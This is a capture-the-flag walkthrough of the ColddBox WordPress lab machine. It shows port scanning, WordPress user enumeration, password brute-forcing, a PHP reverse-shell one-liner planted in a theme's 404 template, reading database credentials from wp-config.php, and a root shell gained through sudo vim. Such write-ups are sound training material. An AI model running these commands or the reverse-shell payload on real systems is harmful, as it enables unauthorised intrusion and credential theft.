# ColddBox: Easy - CTF Walkthrough

**Platform:** Proving Grounds (VulnHub)  
**Difficulty:** Easy/Intermediate  
**Target IP:** 192.168.174.239  
**Date:** December 18, 2025  

## 1. Summary
ColddBox is a WordPress-based boot-to-root machine. The exploitation path involved enumerating a WordPress installation to identify valid users, brute-forcing the login, and gaining initial access via a reverse shell injected into a theme file. Lateral movement was achieved by discovering a password reuse issue in the database configuration, and privilege escalation to root was performed by exploiting a misconfigured `sudo` permission on the `vim` text editor.

## 2. Reconnaissance

### Nmap Scan
I started with a full TCP port scan to identify open services.

```bash
nmap -p- --min-rate=1000 -sV -sC -Pn 192.168.174.239

Results:

    Port 80: HTTP (Apache 2.4.18) - Running a WordPress site.

    Port 4512: SSH (OpenSSH 7.2p2) - Running on a non-standard port.

WordPress Enumeration

Since the site was running WordPress, I used wpscan to enumerate vulnerable plugins and valid usernames.
Bash

wpscan --url [http://192.168.174.239](http://192.168.174.239) --enumerate u

Users Found:

    c0ldd

    hugo

    philip

3. Exploitation
Password Cracking

With a list of valid users, I used wpscan to perform a password brute-force attack against the identified accounts using the rockyou.txt wordlist.
Bash

wpscan --url [http://192.168.174.239](http://192.168.174.239) -U users.txt -P /usr/share/wordlists/rockyou.txt

Success: Found credentials for user c0ldd.
Initial Access (Reverse Shell)

    I logged into the WordPress Dashboard (/wp-admin) using the cracked credentials.

    I navigated to Appearance > Editor and selected the 404 Template (404.php).

    I replaced the PHP code with a system command execution script to spawn a reverse shell back to my listener.

PHP

<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<IP>/4444 0>&1'"); ?>

Triggering the 404 page gave me a shell as www-data.
4. Privilege Escalation
Lateral Movement

I inspected the wp-config.php file in /var/www/html and found the cleartext database password.
Bash

cat wp-config.php | grep DB_PASSWORD

I successfully reused this password to switch users (su c0ldd) to the system user c0ldd.
Root Access (Sudo Abuse)

I checked the user's sudo permissions:
Bash

sudo -l

The user c0ldd was allowed to run /usr/bin/vim as root without a password. I exploited this by spawning a shell from within Vim.
Bash

sudo vim -c ':!/bin/sh'

Status: Rooted. System compromised.
